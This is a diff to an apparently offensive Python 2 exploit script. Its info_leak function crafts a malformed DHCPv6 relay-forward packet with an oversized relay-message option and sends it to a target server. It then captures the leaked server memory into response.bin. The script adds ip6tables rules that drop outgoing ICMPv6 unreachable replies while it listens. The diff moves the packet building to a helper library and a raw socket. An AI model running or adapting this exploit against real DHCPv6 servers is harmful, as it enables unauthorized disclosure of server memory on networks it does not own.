@@ -744,7 +744,7 @@ def inner_pkg(duid):
 
 def info_leak():
     # Add iptables rules to DROP icmp packets
-    system("iptables -A OUTPUT -p icmp -j DROP")
+    system("ip6tables -A OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
 
     # Receive info leak reply
     sock = socket(AF_INET6, SOCK_DGRAM)
@@ -754,31 +754,28 @@ def info_leak():
     duid = unhexlify(str(dhcpv6_server_duid).encode("hex"))
     assert len(duid) == 14
 
-    ipv6_client_addr = inet_pton(AF_INET6, str(IPv6Address(unicode(ipv6src)) + randint(1, 10)))
-    pkg = b"".join([
-        Base.pack8(12),  # DHCP6RELAYFORW
-        '?',
-        # Client addr
-        ipv6_client_addr,
-        '_' * (33 - 17),  # Skip random data.
-        # Option 9 - OPTION6_RELAY_MSG
-        gen_option(9, inner_pkg(duid), length=LEAK_BYTES),
-    ])
+    link_addr = str(IPv6Address(unicode(ipv6src)) + randint(1, 10))
+    peer_addr = ipv6r.get_random_ip(8)
 
-    eth.src = macsrc
-    eth.dst = dhcpv6_server_mac
+    options = {}
+    options_raw = gen_option(9, inner_pkg(duid), LEAK_BYTES)
 
-    ipv6.src = ipv6src
-    ipv6.dst = host
-
-    udp.sport = 546
-    udp.dport = 547
-
-    pkt = eth / ipv6 / udp / pkg
-
+    pkt = dhcpv6r.make_relay_forw_packet(ethernet_src_mac=macsrc,
+                                         ethernet_dst_mac=dhcpv6_server_mac,
+                                         ipv6_src=ipv6src,
+                                         ipv6_dst=host,
+                                         ipv6_flow=0,
+                                         hop_count=63,
+                                         link_addr=link_addr,
+                                         peer_addr=peer_addr,
+                                         options=options,
+                                         options_raw=options_raw)
     try:
-        sendp(pkt, iface=current_network_interface, verbose=False)
-        print Base.c_info + "Send info leak request to: [" + host + "]:" + str(udp.dport)
+        SOCK = socket(AF_PACKET, SOCK_RAW)
+        SOCK.bind((current_network_interface, 0))
+        SOCK.send(pkt)
+        print Base.c_info + "Send info leak request to: [" + host + "]:547"
+        SOCK.close()
     except:
         print Base.c_error + "Do not send info leak request."
         exit(1)
@@ -789,6 +786,9 @@ def info_leak():
         if ready[0]:
             response_file.write(sock.recvfrom(LEAK_BYTES)[0])
         else:
+            # Delete iptables rules to DROP icmp packets
+            system("ip6tables -D OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
+
             print Base.c_error + "Can not receive info leak response!"
             sock.close()
             exit(1)
@@ -800,7 +800,7 @@ def info_leak():
         print Base.c_error + "Bad length of info leak response: " + str(hex(info_leak_size))
 
     # Delete iptables rules to DROP icmp packets
-    system("iptables -D OUTPUT -p icmp -j DROP")
+    system("ip6tables -D OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")
 
     print Base.c_info + "Dump info leak response to file: response.bin"
     sock.close()
